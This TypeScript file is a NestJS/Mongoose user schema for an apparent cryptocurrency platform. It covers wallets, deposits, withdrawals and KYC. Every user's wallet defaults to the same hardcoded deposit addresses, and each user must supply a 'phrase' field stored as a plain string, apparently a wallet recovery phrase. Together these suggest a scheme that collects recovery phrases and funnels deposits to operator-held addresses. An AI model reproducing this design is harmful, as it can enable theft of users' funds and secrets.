import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';
import { Document } from 'mongoose';

export type UserDocument = User & Document;

@Schema({ _id: false })
class withdrawalWallet {
  @Prop() walletAddress: string;
  @Prop() amount: number;
  @Prop() coin: string;
  @Prop() network: string;
}

@Schema({ _id: false })
class depositWallet {
  @Prop() amount: number;
  @Prop() coin: string;
  @Prop() recieptImage: string;
}

@Schema({ _id: false })
export class USDTAddress {
  @Prop() name: string;
  @Prop() address: string;
  @Prop({ default: 0 }) balance: number;
}
export const USDTAddressSchema = SchemaFactory.createForClass(USDTAddress);

@Schema({ _id: false })
export class WalletItem {
  @Prop() address: string;
  @Prop({ default: 0 }) balance: number;
}
const WalletItemSchema = SchemaFactory.createForClass(WalletItem);

@Schema({ _id: false })
export class Wallet {
  @Prop({ type: WalletItemSchema, default: () => ({ address: "bc1q2v4cjsmeg05shfk28stvc74dy8cfa2k2j32hlp" }) }) BTC: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF" }) }) ETH: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "9PwLjinV7riyVhe4PjseZBJw2y7wt8uoWa1wqTyX8pfV" }) }) SOL: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF" }) }) BNB: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "rLNwyfNs8YwapeBRJhj5igj3NRMZGiNufQ" }) }) XRP: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "ltc1q6qxqkk9ztf46r8z4504s4v8dzrqx3x5wk05z32" }) }) LTC: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "GAXMTCYHBDZMUPWQOWSFS3OQXJDB3PBJ4S6F4FO5VPWUTH3D7LXYJFXY" }) }) XLM: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "TSrUZySdmHRzRnAFPHpaFPHZtbqmDvbJeS" }) }) TRX: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "DH76FhAmjhipaxtZhfvNgp7VoJMdwYZ6Y6" }) }) DOGE: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF" }) }) POLYGON: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "terra1z3fe644et7c4p67ju2spjfqc4xz03jxk2p85vk" }) }) LUNC: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "addr1qx6dqn7g4z5vjehan2llreaupaudhgdk22jl0ykx4trrddd577h5g2h7ak5y7eucyxfdznhaqdlq0kfl5ya50sqswf2qaahypf" }) }) ADA: WalletItem;

  @Prop({
    type: [USDTAddressSchema],
    default: [
      { name: "USDT (ERC20)", address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF", balance: 0 },
      { name: "USDT (BEP20)", address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF", balance: 0 },
      { name: "USDT (TRC20)", address: "TSrUZySdmHRzRnAFPHpaFPHZtbqmDvbJeS", balance: 0 }
    ]
  })
  USDT: USDTAddress[];

  @Prop({ type: WalletItemSchema, default: () => ({ address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF" }) }) USDC: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF" }) }) SHIBA: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "0x464B0007a2A4C29912f0fb3EB8A15831961890CF" }) }) PEPE: WalletItem;
  @Prop({ type: WalletItemSchema, default: () => ({ address: "9PwLjinV7riyVhe4PjseZBJw2y7wt8uoWa1wqTyX8pfV" }) }) TROLL: WalletItem;
}
const WalletSchema = SchemaFactory.createForClass(Wallet);

@Schema({ timestamps: true })
export class User {
  @Prop() fullname: string;

  @Prop({ required: true, unique: true }) email: string;
  @Prop({ required: true }) phrase: string;

  @Prop() country: string;
  @Prop() phone: string;
  @Prop() address: string;

  @Prop({ type: WalletSchema, default: () => ({}) })
  wallet: Wallet;

  @Prop({ type: depositWallet }) depositWallet: depositWallet;
  @Prop({ type: String, enum: ['pending', 'completed', 'failed'] }) depositStatus: 'pending' | 'completed' | 'failed';

  @Prop({ type: withdrawalWallet }) withdrawalWallet: withdrawalWallet;
  @Prop({ type: String, enum: ['pending', 'completed', 'failed'] }) withdrawStatus: 'pending' | 'completed' | 'failed';

  @Prop({ type: Boolean, default: false }) isVerified: boolean;
  @Prop({ type: String, enum: ['verified', 'pending', 'unverified'], default: 'unverified' }) verificationStatus: 'verified' | 'pending' | 'unverified';
  @Prop({ type: Boolean, default: false }) activation: false;

  @Prop({ type: String, select: false, default: undefined }) activationCode?: string;
  @Prop({ type: Number, select: false, default: undefined }) activationCodeValidation?: number;

  @Prop({ type: String, default: undefined }) KYC?: string;
  @Prop({ type: Boolean, default: false }) KYCVerified: boolean
  @Prop({ type: String, enum: ['verified', 'pending', 'unverified'], default: 'unverified' }) KYCVerificationStatus: 'verified' | 'pending' | 'unverified'

  @Prop({ type: Boolean, default: false }) ActivateBot: boolean;
  @Prop({ type: Date, default: Date.now() }) joinDate: Date;
}

export const UserSchema = SchemaFactory.createForClass(User);
